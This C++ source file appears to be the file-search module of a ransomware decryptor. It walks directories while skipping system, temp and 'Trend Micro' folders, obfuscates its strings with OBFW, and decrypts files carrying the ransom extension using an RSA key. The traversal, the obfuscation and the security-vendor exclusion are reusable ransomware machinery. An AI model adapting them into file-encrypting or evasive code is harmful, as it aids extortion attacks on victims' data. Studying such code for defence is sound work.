#include "filesystem.h"
#include <shlwapi.h>
#include "../threadpool/threadpool.h"
#include "../global/global_parameters.h"
#include "../obfuscation/MetaString.h"
#include "../decryptor.h"

typedef struct directory_info_ {

	std::wstring Directory;
	TAILQ_ENTRY(directory_info_) Entries;

} DIRECTORY_INFO, *PDIRECTORY_INFO;

STATIC
std::wstring
MakeSearchMask(__in std::wstring Directory)
{
	WCHAR t = Directory[Directory.length() - 1];
	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");
	return SearchMask;
}

STATIC
std::wstring
MakePath(
	__in std::wstring Directory,
	__in std::wstring Filename
	)
{
	WCHAR t = Directory[Directory.length() - 1];
	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;
	return Path;
}

STATIC
BOOL
CheckDirectory(__in LPCWSTR Directory)
{
	LPCWSTR BlackList[] =
	{

		OBFW(L"tmp"),
		OBFW(L"winnt"),
		OBFW(L"temp"),
		OBFW(L"thumb"),
		OBFW(L"$Recycle.Bin"),
		OBFW(L"$RECYCLE.BIN"),
		OBFW(L"Boot"),
		OBFW(L"Windows"),
		OBFW(L"Trend Micro")

	};

	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
	for (INT i = 0; i < Count; i++) {
		if (StrStrIW(Directory, BlackList[i])) {
			return FALSE;
		}
	}

	return TRUE;
}

STATIC
BOOL
CheckFilename(__in LPCWSTR FileName)
{
	if (StrStrIW(FileName, global::GetExtention())) {
		return TRUE;
	}

	return FALSE;
}


VOID
filesystem::SearchFiles(
	__in std::wstring StartDirectory,
	__in HCRYPTPROV CryptoProvider, 
	__in HCRYPTKEY RsaKey, 
	__in LPBYTE Buffer
	)
{
	TAILQ_HEAD(, directory_info_) DirectoryList;
	TAILQ_INIT(&DirectoryList);

	PDIRECTORY_INFO StartDirectoryInfo = new DIRECTORY_INFO;
	if (!StartDirectoryInfo) {
		return;
	}

	StartDirectoryInfo->Directory = StartDirectory;
	TAILQ_INSERT_TAIL(&DirectoryList, StartDirectoryInfo, Entries);

	while (!TAILQ_EMPTY(&DirectoryList)) {

		WIN32_FIND_DATAW FindData;
		PDIRECTORY_INFO DirectoryInfo = TAILQ_FIRST(&DirectoryList);
		if (DirectoryInfo == NULL) {
			break;
		}

		std::wstring CurrentDirectory = DirectoryInfo->Directory;
		std::wstring SearchMask = MakeSearchMask(CurrentDirectory);

		HANDLE hSearchFile = FindFirstFileW(SearchMask.c_str(), &FindData);
		if (hSearchFile == INVALID_HANDLE_VALUE) {

			TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);
			delete DirectoryInfo;
			continue;

		}

		do {

			if (!lstrcmpW(FindData.cFileName, OBFW(L".")) ||
				!lstrcmpW(FindData.cFileName, OBFW(L"..")) ||
				FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
			{
				continue;
			}

			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				CheckDirectory(FindData.cFileName))
			{

				std::wstring Directory = MakePath(CurrentDirectory, FindData.cFileName);
				PDIRECTORY_INFO DirectoryInfo = new DIRECTORY_INFO;
				DirectoryInfo->Directory = Directory;
				TAILQ_INSERT_TAIL(&DirectoryList, DirectoryInfo, Entries);

			}
			else if (CheckFilename(FindData.cFileName)) {

				std::wstring Filename = MakePath(CurrentDirectory, FindData.cFileName);
				decryptor::FILE_INFO FileInfo;
				RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));
				FileInfo.Filename = Filename.c_str();
				decryptor::Decrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

			}


		} while (FindNextFileW(hSearchFile, &FindData));

		TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);
		delete DirectoryInfo;
		FindClose(hSearchFile);
		Sleep(50);
	}
}
